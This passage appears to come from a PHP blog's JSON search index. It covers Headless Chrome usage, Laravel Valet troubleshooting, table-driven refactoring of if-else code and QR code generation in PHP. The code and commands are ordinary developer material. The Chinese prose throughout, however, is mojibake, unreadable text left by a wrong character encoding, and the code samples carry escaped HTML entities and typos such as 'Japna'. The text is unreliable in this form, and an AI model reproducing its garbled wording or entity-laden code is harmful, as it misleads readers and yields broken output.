æ”¯æŒçš„ç‰¹æ€§è¿è¡Œä½ çš„ç¨‹åºã€‚ç›¸æ¯”äºç°ä»£æµè§ˆå™¨ï¼ŒHeadless Chrome æ›´åŠ æ–¹ä¾¿æµ‹è¯• Web åº”ç”¨ï¼Œè·å¾—ç½‘ç«™çš„æˆªå›¾ï¼Œåšçˆ¬è™«æŠ“å–ä¿¡æ¯ç­‰ã€‚ å¦‚ä½•è·å– Headless Chromeåœ¨ Mac ä¸Šï¼ŒChrome 59 ä»¥åçš„ç‰ˆæœ¬å‡æ­è½½äº† Headless Chromeï¼Œæ‰€ä»¥åªè¦ä¿è¯ Google Chrome ç‰ˆæœ¬ä¸è¦ä½äº 59 å³å¯ã€‚ 123/Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome --versionGoogle Chrome 99.0.4844.51 æˆ–è€…ç›´æ¥åœ¨ Chrome ä¸­è¾“å…¥ï¼šchrome://versionï¼Œè¿›è¡ŒæŸ¥çœ‹ã€‚ Windows ç”¨æˆ·æ‰¾ä¸€ä¸‹ Chrome çš„å®‰è£…è·¯å¾„ï¼Œé€šå¸¸æ˜¯ï¼šC:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome Linxu æœåŠ¡å™¨åˆ™ä½¿ç”¨ google-chromeï¼ˆéœ€è¦æå‰å®‰è£…ï¼‰ CentOS å®‰è£… Google Chrome ä¸‹è½½ Chrome æœ€æ–°çš„rpm 1wget https://dl.google.com/linux/direct/google-chrome-stable_current_x86_64.rpm å®‰è£… Chrome 1sudo yum install .&#x2F;google-chrome-stable_current_*.rpm æŸ¥çœ‹å½“å‰ç‰ˆæœ¬ 1google-chrome -version å¦‚ä½•åœ¨ç»ˆç«¯ä¸­ä½¿ç”¨Mac ç”¨æˆ·åœ¨ç»ˆç«¯ä½¿ç”¨ä¹‹å‰ï¼Œå»ºè®®å…ˆç»‘å®šåˆ«åï¼Œä½¿ç”¨èµ·æ¥æ›´æ–¹ä¾¿ï¼š 1alias google-chrome&#x3D;&quot;&#x2F;Applications&#x2F;Google\\ Chrome.app&#x2F;Contents&#x2F;MacOS&#x2F;Google\\ Chrome&quot; 1google-chrome --headless --disable-gpu --remote-debugging-port&#x3D;9222 https:&#x2F;&#x2F;www.github.com å‚æ•°è¯´æ˜ï¼š --headlessï¼šä½¿ç”¨ headless æ¨¡å¼è¿è¡Œ Chrome --disable-gpuï¼šå±è”½ç°é˜¶æ®µå¯èƒ½è§¦å‘çš„é”™è¯¯ --remote-debug-port=9222ï¼šDevTools è¿œç¨‹è°ƒè¯•Chrome https://www.github.comï¼šç›®æ ‡åœ°å€ ä¿å­˜ä¸ºæˆªå›¾--screenshot å‚æ•°å¯ä»¥å°†é¡µé¢å†…å®¹ä¿å­˜ä¸ºæˆªå›¾ï¼š 1google-chrome --headless --disable-gpu --screenshot --window-size=1280,1696 https://github.com ä¿å­˜ä¸ºPDF--print-to-pdf å‚æ•°å¯ä»¥å°†é¡µé¢å†…å®¹ä¿å­˜ä¸ºPDFï¼š 1google-chrome --headless --disable-gpu --print-to-pdf https://github.com æ‰“å°DOM--dump-dom å‚æ•°å°† document.body.innerHTML è¾“å‡ºï¼š 1google-chrome --headless --disable-gpu --dump-dom https://github.com åœ¨ PHP ä¸­ä½¿ç”¨ Headless ChromeChrome PHP æ˜¯ä¸€ä¸ªå¯ä»¥åœ¨ headless æ¨¡å¼ä¸‹ä½¿ç”¨ Chrome/Chromium çš„ç±»åº“ã€‚ å®‰è£…ï¼š 1composer require chrome-php/chrome ä½¿ç”¨ï¼š 123456789101112131415161718192021222324252627282930313233343536373839use HeadlessChromium\\BrowserFactory;try &#123; // chrome/chromium å®‰è£…ä½ç½® $browserFactory = new BrowserFactory('/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'); // starts headless chrome $browser = $browserFactory-&gt;createBrowser(); // cr3eates a new page and navigate to an url $page = $browser-&gt;createPage(); $page-&gt;navigate(\"https://github.com\")-&gt;waitForNavigation(); // è·å–æµè§ˆå™¨æ»šåŠ¨æ¡å®½é«˜ï¼Œç”¨äºè®¾ç½®ï¼šsetViewport $evaluation = $page-&gt;callFunction( 'function() &#123; var width = document.body.scrollWidth; var height = document.body.scrollHeight; return [width,height]; &#125;' ); $value = $evaluation-&gt;getReturnValue(); $width = $value[0]; $height = $value[1]; $page-&gt;setViewport($width, $height)-&gt;await(); // wait for operation to complete // take the screenshot (in memory binaries) $screenshot = $page-&gt;screenshot([ 'format' =&gt; 'jpeg', // default to 'png' - possible values: 'png', 'jpeg', 'quality' =&gt; 100, // only if format is 'jpeg' - default 100 ]); // ä¿å­˜å›¾ç‰‡ $screenshot-&gt;saveToFile(\"github.png\");&#125; finally &#123; // å…³é—­æµè§ˆå™¨ $browser-&gt;close();&#125; å‚è€ƒé“¾æ¥ Chrome-PHP Chromium Project åˆæ¢ Headless Chrome","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"Laravel Valet ä½¿ç”¨é—®é¢˜æ•´ç†","slug":"laravel-valet-uses-problem-sorting","date":"2022-02-27T06:48:47.000Z","updated":"2022-03-11T01:21:50.969Z","comments":true,"path":"laravel-valet-uses-problem-sorting/","link":"","permalink":"https://www.0x2beace.com/laravel-valet-uses-problem-sorting/","excerpt":"Valet æ˜¯ Mac æç®€ä¸»ä¹‰è€…çš„ Laravel å¼€å‘ç¯å¢ƒã€‚","text":"Valet æ˜¯ Mac æç®€ä¸»ä¹‰è€…çš„ Laravel å¼€å‘ç¯å¢ƒã€‚ é—®é¢˜ä¸€brew services stop phpå’Œ valet stop å…¨éƒ¨åœæ­¢ä¹‹åï¼š è®¿é—®ç«™ç‚¹ï¼š brew services stop php ä¹‹åï¼Œå¯ç”¨ valet start ï¼š ç«™ç‚¹è¿˜æ˜¯è®¿é—®ä¸äº†ï¼Œä¸€ç›´æ˜¾ç¤º 502ï¼ŒåŒæ—¶~/.config/valet/Log/nginx-error.log ä¼šè¾“å‡ºä»¥ä¸‹æ—¥å¿—ï¼š 12022&#x2F;02&#x2F;22 20:32:00 [crit] 36873#0: *1 connect() to unix:&#x2F;Users&#x2F;boo&#x2F;.config&#x2F;valet&#x2F;valet.sock failed (13: Permission denied) while connecting to upstream, client: 127.0.0.1, server: , request: &quot;GET &#x2F; HTTP&#x2F;1.1&quot;, upstream: &quot;fastcgi:&#x2F;&#x2F;unix:&#x2F;Users&#x2F;boo&#x2F;.config&#x2F;valet&#x2F;valet.sock:&quot;, host: &quot;localhost&quot; æŸ¥äº†ä¸€ä¸‹ï¼Œçœ‹åˆ°äº†è¿™ä¸ªç­”æ¡ˆï¼Œæœ€åå°è¯•ä»¥ä¸‹å‘½ä»¤ï¼Œè§£å†³ï¼š 123composer global updatevalet installvalet restart é—®é¢˜äºŒå†æ¬¡è®¿é—®é»˜è®¤ç«™ç‚¹ï¼Œå³å¯çœ‹åˆ°æ­£å¸¸è¾“å‡ºé¡µé¢ï¼š ä½†æ˜¯å½“æˆ‘è®¿é—®åŒç›®å½•ä¸‹çš„å…¶ä»–éé»˜è®¤ç«™ç‚¹æ—¶ï¼ˆvalet çš„é¡¶çº§åŸŸåï¼Œæ¯”å¦‚ phpinfo.testï¼‰ï¼Œåˆä¼šå‡ºç° 502ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿè€Œä¸”è¿™ä¸€æ¬¡è¿˜æ²¡æœ‰çœ‹åˆ°ä»»ä½•error.log è¾“å‡ºã€‚ é‚£è¿™ä¸ªå°±å’ŒNginx æˆ–è€… PHP-FPM æ²¡æœ‰ä»€ä¹ˆå…³ç³»äº†ã€‚ è¿™æ˜¯å› ä¸ºæœ¬åœ°çš„Clash è®¾ç½®äº†ç³»ç»Ÿä»£ç†ï¼Œæ‰€æœ‰è¯·æ±‚éƒ½æ˜¯é€šè¿‡ 127.0.0.1:7890 è½¬å‘å‡ºå»çš„ã€‚ å…·ä½“å¯ä»¥çœ‹ä¸€ä¸‹ä¸‹é¢ä¸¤ä¸ªIssueï¼š æ‰“å¼€clashxä¹‹åï¼Œmacç³»ç»Ÿé…ç½®çš„hostså°±ä¼šå¤±æ•ˆ å¼€å¯ç³»ç»Ÿä»£ç†æŸäº›æƒ…å†µä¸‹ä¼šå¯¼è‡´æ— æ³•æ­£å¸¸è¿æ¥ æ€»ç»“ å¯ç”¨ Valet çš„è¯ï¼Œå°±ä¸ç”¨å†æ‰‹åŠ¨ä½¿ç”¨brew å¯ç”¨PHP æˆ–è€… Nginx äº†ï¼Œå¦åˆ™ç«¯å£ä¼šå†²çª æœ¬åœ°å¯ç”¨ç³»ç»Ÿä»£ç†çš„æƒ…å†µä¸‹ï¼Œè®¿é—®Valet ä¸‹çš„é¡¶çº§åŸŸåç«™ç‚¹ï¼Œé€šå¸¸ä¼šå¤±è´¥ å¸¸ç”¨å‘½ä»¤Valet å¸¸ç”¨å‘½ä»¤ å‘½ä»¤ æè¿° valet forget ä»ä¸€ä¸ªã€é©»ç•™ã€ç›®å½•è¿è¡Œæ­¤å‘½ä»¤ï¼Œä»é©»ç•™ç›®å½•åˆ—è¡¨å°†å…¶å®ƒç§»é™¤ valet log ä» Valet çš„æœåŠ¡ä¸­æŸ¥çœ‹æ—¥å¿— valet paths æŸ¥çœ‹æ‰€æœ‰ã€é©»ç•™ã€è·¯å¾„ valet restart é‡å¯ Valet å®ˆæŠ¤è¿›ç¨‹ valet start å¼€å¯ Valet å®ˆæŠ¤è¿›ç¨‹ valet stop åœæ­¢ Valet å®ˆæŠ¤è¿›ç¨‹ valet trust ä¸º Brew å’Œ Valet æ·»åŠ æ–‡ä»¶ä¿®æ”¹æƒé™ä½¿ Valet è¾“å…¥å‘½ä»¤çš„æ—¶å€™ä¸éœ€è¦è¾“å…¥å¯†ç  valet uninstall å®Œæˆå¸è½½ Valet å®ˆæŠ¤è¿›ç¨‹ valet use php@7.2 åˆ‡æ¢PHP ç‰ˆæœ¬ valet tld app åˆ‡æ¢é¡¶çº§åŸŸå","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"},{"name":"Mac","slug":"PHP/Laravel/Mac","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/Mac/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"å¦‚ä½•é¿å…å†™å‡º If-Else","slug":"how-to-avoid-writing-out-if-else","date":"2022-02-27T06:41:32.000Z","updated":"2023-02-18T03:28:33.600Z","comments":true,"path":"how-to-avoid-writing-out-if-else/","link":"","permalink":"https://www.0x2beace.com/how-to-avoid-writing-out-if-else/","excerpt":"æœ¬æ–‡å¹¶ä¸è‚¯å®šæˆ–è€…å¦å®šå“ªä¸€ç§å†™æ³•ï¼Œä»…ä»…ä¸ºå¤§å®¶æä¾›ä¸€äº›å…¶ä»–çš„ç¼–ç æ€è·¯æˆ–è€…ä¸€äº›å€¼å¾—å€Ÿé‰´çš„ç‚¹å­ã€‚","text":"æœ¬æ–‡å¹¶ä¸è‚¯å®šæˆ–è€…å¦å®šå“ªä¸€ç§å†™æ³•ï¼Œä»…ä»…ä¸ºå¤§å®¶æä¾›ä¸€äº›å…¶ä»–çš„ç¼–ç æ€è·¯æˆ–è€…ä¸€äº›å€¼å¾—å€Ÿé‰´çš„ç‚¹å­ã€‚ ä¸ºä»€ä¹ˆè¦é¿å…ä½¿ç”¨if-elseif-else é€šå¸¸æ˜¯ä¸€ä¸ªç³Ÿç³•çš„é€‰æ‹©ï¼Œå®ƒå¯¼è‡´è®¾è®¡å¤æ‚ï¼Œä»£ç å¯è¯»æ€§å·®ï¼Œå¹¶ä¸”å¯èƒ½å¯¼è‡´é‡æ„å›°éš¾ã€‚ è¿™é‡Œä»¥è¡¨é©±åŠ¨æ³•ä¸ºä¾‹ï¼Œæ¥ä»‹ç»ä¸€ä¸‹ä¸ºä»€ä¹ˆè¦é¿å…ä½¿ç”¨if-elseã€‚ è¡¨é©±åŠ¨æ³•çš„æ„ä¹‰åœ¨äºé€»è¾‘å’Œæ•°æ®åˆ†ç¦»ï¼Œåœ¨ç¨‹åºä¸­ï¼Œæ·»åŠ æ•°æ®å’Œæ·»åŠ é€»è¾‘çš„æ–¹å¼ã€æˆæœ¬æ˜¯ä¸ä¸€æ ·çš„ï¼Œç®€å•æ¥è¯´ï¼š æ·»åŠ æ•°æ®éå¸¸ç®€å•ï¼Œå±äºä½æˆæœ¬ã€ä½é£é™© è€Œæ·»åŠ é€»è¾‘æ˜¯å¤æ‚çš„ï¼Œå±äºé«˜æˆæœ¬ã€é«˜é£é™© ä¸‹é¢æ˜¯ä¸€æ®µç”¨è¡¨é©±åŠ¨æ³•é‡æ„ä¹‹å‰çš„if-elseä»£ç  123456789101112&lt;?phpfunction contry_initial($country)&#123; if ($country===\"China\" )&#123; return \"CHN\"; &#125;else if($country===\"America\")&#123; return \"USA\"; &#125;else if($country===\"Japna\")&#123; return \"JPN\"; &#125;else&#123; return \"OTHER\"; &#125;&#125; ç°åœ¨å¦‚æœéœ€è¦å¢åŠ ä¸€ä¸ªå›½å®¶ï¼Œç»§ç»­ä½¿ç”¨if-else å†™çš„è¯ï¼Œå°±ç­‰åŒäºå¢åŠ ä¸€ä¸ªé€»è¾‘ã€‚ 123456789&lt;?phpfunction contry_initial($country)&#123; if ($country===\"China\" )&#123; return \"CHN\"; &#125; else if ($country===\"Korea\") &#123; return \"KR\"; &#125; // ...&#125; å¦‚æœæ”¹æˆè¡¨é©±åŠ¨æ³•å°±æ˜¯ï¼š 1234567891011121314&lt;?phpfunction contry_initial($country)&#123; $countryList=[ \"China\"=&gt; \"CHN\", \"America\"=&gt; \"USA\", \"Japna\"=&gt; \"JPN\", ]; if(array_key_exists($country, $countryList)) &#123; return $countryList[$country]; &#125; return \"Other\";&#125; æ”¹å†™æˆè¡¨é©±åŠ¨æ³•ä¹‹åï¼Œå¦‚æœéœ€è¦å¢åŠ ä¸€ä¸ªå›½å®¶ï¼Œå°±åªéœ€è¦åœ¨æ•°ç»„é‡Œé¢åŠ ä¸ªæ•°æ®ï¼Œæ­¤æ—¶å°±åˆ†ç¦»äº†æ•°æ®ä¸é€»è¾‘çš„å…³ç³»äº†ã€‚ é‡æ„åˆ°æ­¤ç»“æŸï¼Œè¿™æ ·åšçš„å¥½å¤„æœ‰å“ªäº›å‘¢ï¼Ÿ ä»£ç æœ¬èº«çš„ä¼˜åŠ¿ é€»è¾‘å’Œæ•°æ®åˆ†ç¦»ï¼Œä¸¤è€…ä¸€ç›®äº†ç„¶ å…³ç³»è¡¨å¯ä»¥æ›´æ¢ï¼Œæ¯”å¦‚å›½å®¶è¡¨æ ¼å¯ä»¥æ˜¯å¤šè¯­è¨€çš„ï¼Œä¸­æ–‡ç‰ˆè¡¨æ ¼ï¼Œè‹±æ–‡ç‰ˆè¡¨æ ¼ç­‰ï¼Œæ—¥è¯­ç‰ˆè¡¨æ ¼ï¼Œä»¥åŠå•å…ƒæµ‹è¯•ä¸­ï¼Œå¯ä»¥æ³¨å…¥æµ‹è¯•è¡¨æ ¼ã€‚ åœ¨å•å…ƒæµ‹è¯•ä¸­ï¼Œé€»è¾‘å¿…é¡»æµ‹è¯•ï¼Œè€Œæ•°æ®æ— éœ€æµ‹è¯•ã€‚å¯ä»¥æƒ³è±¡å¦‚æœæ²¡æœ‰è¡¨æ ¼æ³•ï¼Œå¼„ä¸ªå¤šè¯­è¨€ï¼Œè¦å†™å¤šå°‘è¯­å¥ã€‚ æ•°æ®æ¥æºçš„çµæ´»æ€§å›½å®¶è¡¨æ ¼çš„æ•°æ®å¯ä»¥æ¥æºä»¥ä¸‹æ¸ é“ï¼š æ¥è‡ªä»£ç  æ¥è‡ªé…ç½® æ¥è‡ªæ•°æ®åº“ æ¥è‡ªç¬¬ä¸‰æ–¹ API â€¦ æ•°æ®è¾“å…¥ä¿®æ”¹çš„æˆæœ¬ä¸é£é™©æˆ‘ä»¬æƒ³æƒ³ï¼Œè˜ç”¨ä¸€ä¸ªä¸æ‡‚ç¼–ç¨‹ï¼Œä½†åŸ¹è®­ä¸€ä¸‹å°±ä¼šç”¨åå°çš„å®¢æœä¾¿å®œï¼Œè¿˜æ˜¯ä¼šä¸€ä¸ªæ‡‚ç³»ç»Ÿå¼€å‘äººå‘˜ä¾¿å®œï¼Ÿ å¦‚æœè¿™ä¸ªæ˜¯æ•°æ®ï¼Œæ˜¯æ¥è‡ªäºæ•°æ®åº“çš„ï¼Œé‚£ä¹ˆåŸºæœ¬ä¸Šå…¬å¸çš„ä»»ä½•æœ‰æƒé™çš„äººåœ¨åå°æŠŠè¿™ä¸ªæ˜ å°„è¡¨å¡«ä¸€ä¸‹ï¼Œå°±èƒ½æ­£å¸¸å·¥ä½œäº†ã€‚è¿™ä¸ªè€—è´¹ä¸é£é™©å‡ ä¹å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚ å¦‚æœæ•°æ®æ¥è‡ªç¬¬ä¸‰æ–¹ APIï¼Œå¦‚æœç¬¬ä¸‰æ–¹æ·»åŠ ä¿®æ”¹äº†æ•°æ®ï¼Œä½ ä¹Ÿæ˜¯åŸºæœ¬æ”¾å¿ƒçš„ã€‚ ä½†æ˜¯å¦‚æœè¿™ä¸ªæ˜¯é€»è¾‘æœ¬èº«ï¼Œé‚£ä¹ˆåªèƒ½æ˜¯è¿™ä¸ªç³»ç»Ÿå¼€å‘äººå‘˜è¿›è¡Œä¿®æ”¹ï¼Œæ„å»ºï¼Œç„¶åç»è¿‡ä¸€ç³»åˆ—çš„æµ‹è¯•ï¼Œè¿›è¡Œä¸“ä¸šéƒ¨ç½²æµç¨‹ï¼Œä½¿å¾—è¿™ä¸ªåŠŸèƒ½åœ¨äº§å“ä¸Šè¿è¡Œï¼Œæ˜¯ä¸ªè€—è´¹ä¸é£é™©æ˜¯ä¸è¨€è€Œå–»çš„ã€‚å¦å¤–è€ƒè™‘åˆ°å¤šäººå¼€å‘ï¼Œå¼€å‘é£æ ¼ä¸ç»Ÿä¸€çš„è¯ï¼Œé‚£ä¹ˆä»£ç å®¡æŸ¥å°±ä¸å¯é¿å…äº†ã€‚ æ•°æ®æ ¼å¼çš„å¼ºåˆ¶æ€§å’Œä»£ç é£æ ¼çš„éšæ„æ€§åœ¨ç°å®ä¸­ï¼Œå¤šäººå¼€å‘åŒä¸€ä¸ªåŠŸèƒ½æ˜¯å¾ˆå¸¸è§çš„ï¼Œè¿™é‡Œå°±ä¼šæœ‰ä¸€ä¸ªå¤šäººä»£ç é£æ ¼ç»Ÿä¸€çš„é—®é¢˜ã€‚ è€Œå¯¹äºæ•°æ®æ¥è¯´ï¼Œä¸€æ—¦æ•°æ®çš„æ ¼å¼è¢«ç¡®è®¤ä¹‹åï¼Œæ•°æ®æ ¼å¼å°±æ˜¯å¼ºåˆ¶æ€§çš„äº†ã€‚ æ¯”å¦‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæ— è®ºæ˜¯è°ï¼ŒåŠ å‡ ä¸ªç¾å›½çš„æ•°æ®ä¹Ÿåªèƒ½è¿™æ ·åŠ ï¼š 12345678$countryList=[ \"China\"=&gt; \"CHN\", \"America\"=&gt; \"USA\", \"Japan\"=&gt; \"JPN\", \"US\"=&gt; \"USA\", \"United States of America\"=&gt; \"USA\", \"ç¾å›½\"=&gt; \"USA\", ]; å°±ç®—åŸå§‹æ•°æ®èŠ±æ ·ä¸°å¯Œï¼Œæœ€ç»ˆæ•°æ®å¿…é¡»æ ¼å¼åŒ–æˆå¦‚æ­¤ã€‚ ç„¶è€Œå¦‚æœæ˜¯é€»è¾‘çš„è¯ï¼Œäººä¸€å¤šï¼Œé€»è¾‘æ–¹æ³•å°±å¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚ä½ å¯èƒ½æŒ‡æœ›å¯¹æ–¹è¿™æ ·å†™ä»£ç ï¼š 123456789101112131415if ($country===\"China\" )&#123; return \"CHN\";&#125;else if($country===\"America\")&#123; return \"USA\";&#125;else if($country===\"Japan\")&#123; return \"JPN\";&#125;else if($country===\"US\")&#123; return \"USA\";&#125;else if($country===\"United States of America\")&#123; return \"USA\";&#125;else if($country===\"ç¾å›½\")&#123; return \"USA\";&#125;else&#123; return \"OTHER\";&#125; ç„¶è€Œï¼Œå¯¹æ–¹å¯èƒ½ä¼šè¿™æ ·å†™ï¼š 123456789 if ($country === \"China\") &#123; return \"CHN\"; &#125; else if (in_array($country, [\"America\", \"US\", \"United States of America\", \"ç¾å›½\"])) &#123; return \"USA\"; &#125; else if ($country === \"Japan\") &#123; return \"JPN\"; &#125; else &#123; return \"\"&#125; åæ¥å¤šäº†ä¸€ä¸ªæ—¥æœ¬çš„éœ€æ±‚ï¼Œåˆäº¤ç»™ä¸åŒçš„äººå»å®Œæˆï¼Œè¯´ä¸å®šæœ€åä¼šå†™æˆè¿™æ ·ï¼š 123456789 if ($country === \"China\") &#123; return \"CHN\"; &#125; else if (in_array($country, [\"America\", \"US\", \"United States of America\", \"ç¾å›½\"])) &#123; return \"USA\"; &#125; else if ($country === \"Japan\"||$country === \"æ—¥æœ¬\") &#123; return \"JPN\"; &#125; else &#123; return \"\"&#125; æ€æ ·å†™ï¼Œéƒ½æ²¡æœ‰é”™ï¼Œç„¶è€Œé£æ ¼å´å¤§ç›¸å¾„åº­ã€‚åœ¨å¤šäººåˆä½œç¼–ç¨‹è¿‡ç¨‹ä¸­ï¼Œæ— æ³•æ§åˆ¶æ‰€æœ‰äººçš„é£æ ¼ï¼Œå¦‚æœéœ€è¦ç»Ÿä¸€é£æ ¼ï¼Œå¿…é¡»ä¾é ä»£ç å®¡æŸ¥ï¼Œè¿™éœ€è¦å¤§é‡èµ„æºå’Œæˆæœ¬ã€‚ å¦å¤–ï¼Œå°±æ˜¯å› ä¸ºå¦‚æ­¤ï¼Œæ‰€æœ‰å’Œ if else ç›¸å…³çš„é€»è¾‘åœ¨å•å…ƒæµ‹è¯•ä¸­å¿…é¡»è¿›è¡Œä¸€æ¬¡æµ‹è¯•ï¼Œæ‰èƒ½æœ‰ä»£ç è¦†ç›–ç‡ï¼›è€Œå¦‚æœæ˜¯æ•°æ®ï¼Œç”±äºæ•°æ®æ ¼å¼çš„å¯æ§æ€§ï¼Œæ— éœ€å¯¹æ•°æ®è¿›è¡Œæµ‹è¯•ã€‚æ‰€ä»¥è¯´ï¼š åœ¨å¤šäººå¼€å‘çš„é¡¹ç›®ä¸­ï¼Œé€»è¾‘æ— åºè€Œä¸å¯æ§ï¼›æ•°æ®æ ¼å¼æœ‰åºè€Œææ˜“æ§åˆ¶ åœ¨å•å…ƒæµ‹è¯•ä¸­ï¼Œé€»è¾‘åŒºå—å¿…é¡»è¿›è¡Œæµ‹è¯•ï¼›è€Œæ•°æ®æœ¬èº«æ— éœ€æµ‹è¯• æå‰è¿”å›è¿™ä¹Ÿè®¸æ˜¯åˆçº§å¼€å‘äººå‘˜å¾ˆå®¹æ˜“çŠ¯çš„é”™è¯¯ä¹‹ä¸€ã€‚ 1234567public function sayHi($name)&#123; if (!empty($name))&#123; return \"Hi\" . $name; &#125; else &#123; // do something else &#125;&#125; åªéœ€è¦åˆ é™¤å®Œå…¨ä¸å¿…è¦çš„ Else å—ï¼Œå³å¯ç®€åŒ–æ­¤è¿‡ç¨‹ï¼š 1234567public function say($name)&#123; if (!empty($name))&#123; return \"Hi\" . $name; &#125; // do something else&#125; åƒè¿™ç§æ¡ä»¶å•ä¸€çš„åœºæ™¯ï¼Œæ»¡è¶³æŸä¸ªæ¡ä»¶çš„æƒ…å†µä¸‹æ‰§è¡ŒæŸäº›æ“ä½œå¹¶ç«‹å³è¿”å›ï¼ˆæå‰returnï¼‰æ˜¯å¾ˆå¥½åœ°è§£å†³æ–¹æ¡ˆã€‚ è¡¨é©±åŠ¨æ³•ä¸‹é¢çš„æ¡ˆä¾‹æ˜¯å¦å¤–ä¸€ä¸ªæ¯”è¾ƒå¸¸è§çš„ï¼š 1234567891011public function doSomething($input)&#123; if ($input == 0)&#123; $gender = \"woman\"; &#125; else if ($input == 1)&#123; $gender = \"man\"; &#125; else &#123; $gender = \"unknown\"; &#125; return $gender;&#125; åƒè¿™æ ·çš„If-Else è¯­å¥ï¼Œå¯ä»¥çœ‹åˆ°key å’Œvalue æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œæ‰€ä»¥å¯ä»¥è¿™æ ·å†™ï¼š 123456789public function doSomething($input)&#123; $map = [ 0 =&gt; \"woman\", 1 =&gt; \"man\", // ... ]; return !empty($map[$input]) ? $map[$input] : \"unknown\";&#125; å‚è€ƒé“¾æ¥ caoglishâ€”æŠŠ if-else çš„ä»£ç é£æ ¼æ”¹æˆè¡¨æ ¼é©±åŠ¨æ³•çš„æ„ä¹‰","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"å¦‚ä½•åœ¨ PHP ä¸­ç”ŸæˆäºŒç»´ç ","slug":"how-to-generate-qr-code-in-php","date":"2022-02-26T08:00:47.000Z","updated":"2022-03-30T10:26:26.064Z","comments":true,"path":"how-to-generate-qr-code-in-php/","link":"","permalink":"https://www.0x2beace.com/how-to-generate-qr-code-in-php/","excerpt":"å¦‚ä½•åœ¨ PHP ä¸­ç”ŸæˆäºŒç»´ç åŸç”Ÿ PHP æ— æ³•ç›´æ¥ç”ŸæˆäºŒç»´ç ï¼Œå¯ä»¥å€ŸåŠ©ä¸€äº›ç¬¬ä¸‰æ–¹çš„äºŒç»´ç åº“ã€‚è¿™é‡Œä½¿ç”¨ endroid/qr-codeã€‚","text":"å¦‚ä½•åœ¨ PHP ä¸­ç”ŸæˆäºŒç»´ç åŸç”Ÿ PHP æ— æ³•ç›´æ¥ç”ŸæˆäºŒç»´ç ï¼Œå¯ä»¥å€ŸåŠ©ä¸€äº›ç¬¬ä¸‰æ–¹çš„äºŒç»´ç åº“ã€‚è¿™é‡Œä½¿ç”¨ endroid/qr-codeã€‚ å®‰è£…ï¼š 1composer require endroid/qr-code é¦–å…ˆæ¥äº†è§£ä¸€ä¸‹äºŒç»´ç çš„ä¸€äº›åŸºæœ¬ç‰¹å¾ è¿™æ˜¯ä¸€å¼ å¸¸è§çš„äºŒç»´ç ï¼Œç”±ä»¥ä¸‹å‡ éƒ¨åˆ†æ„æˆï¼š â‘ ï¼šå¤–æ¡† â‘¡ï¼šç çœ¼ â‘¢ï¼šç ç‚¹ â‘£ï¼šlogo â‘¤ï¼šæ–‡å­— å…¶ä¸­ç çœ¼å’Œç ç‚¹æ˜¯å¿…è¦çš„ï¼Œå…¶ä½™éƒ¨åˆ†åˆ™å‡æ˜¯ä¸ºäºŒç»´ç ç¾åŒ–çš„è€Œæ·»åŠ çš„ï¼Œéå¿…è¦ã€‚ ç®€å•çš„äºŒç»´ç ç”Ÿæˆ12345678910111213141516171819require \"vendor/autoload.php\";use Endroid\\QrCode\\QrCode;use Endroid\\QrCode\\Writer\\PngWriter;// åˆ›å»ºäºŒç»´ç $qr = QrCode::create(\"Hello World\");$writer = new PngWriter();$result = $writer-&gt;write($qr);// è¾“å‡ºäºŒç»´ç ï¼ˆæ–¹å¼ä¸€ï¼‰$result-&gt;saveToFile(__DIR__ . \"/qr.png\");// æ–¹å¼äºŒ// header(\"Content-Type: \" . $result-&gt;getMimeType());// echo $result-&gt;getString();// æ–¹å¼ä¸‰// echo \"&lt;img src='&#123;$result-&gt;getDataUri()&#125;'/&gt;\"; endroid/qr-code æä¾›ä¸‰ç§ä¸åŒçš„è¾“å‡ºæ¨¡å¼ï¼š saveToFile()ï¼šç”ŸæˆäºŒç»´ç ä»¥å›¾ç‰‡çš„å½¢å¼ä¿å­˜åœ¨æœ¬åœ° getString()ï¼šç›´æ¥è¾“å‡ºåœ¨æµè§ˆå™¨ getDataUri()ï¼šè¾“å‡ºäºŒç»´ç å›¾ç‰‡å¯¹åº”çš„ Base64 äºŒç»´ç ç¾åŒ–1234567891011121314151617181920212223242526272829303132333435363738&lt;?phprequire \"vendor/autoload.php\";use Endroid\\QrCode\\QrCode;use Endroid\\QrCode\\Writer\\PngWriter;use Endroid\\QrCode\\ErrorCorrectionLevel\\ErrorCorrectionLevelHigh;use Endroid\\QrCode\\Color\\Color;use Endroid\\QrCode\\Logo\\Logo;use Endroid\\QrCode\\Label\\Label; // åˆ›å»ºäºŒç»´ç $qr = QrCode::create(\"Hello World\") // è®¾ç½®å®¹é”™ç­‰çº§ -&gt;setErrorCorrectionLevel(new ErrorCorrectionLevelHigh()) // è®¾ç½®å†…å®¹åŒºåŸŸå®½é«˜ï¼Œé»˜è®¤ä¸º300 -&gt;setSize(300) // è®¾ç½®å¤–è¾¹è·ï¼Œé»˜è®¤ä¸º10 -&gt;setMargin(10) // è®¾ç½®äºŒç»´ç é¢œè‰²ï¼Œé»˜è®¤ä¸ºé»‘è‰² -&gt;setForegroundColor(new Color(0, 0, 0)) // è®¾ç½®äºŒç»´ç èƒŒæ™¯è‰²ï¼Œé»˜è®¤ä¸ºç™½è‰² -&gt;setBackgroundColor(new Color(255, 255, 255)); // è®¾ç½® logo$logo = Logo::create(__DIR__ . \"/logo.png\") // è®¾ç½® logo å¤§å° 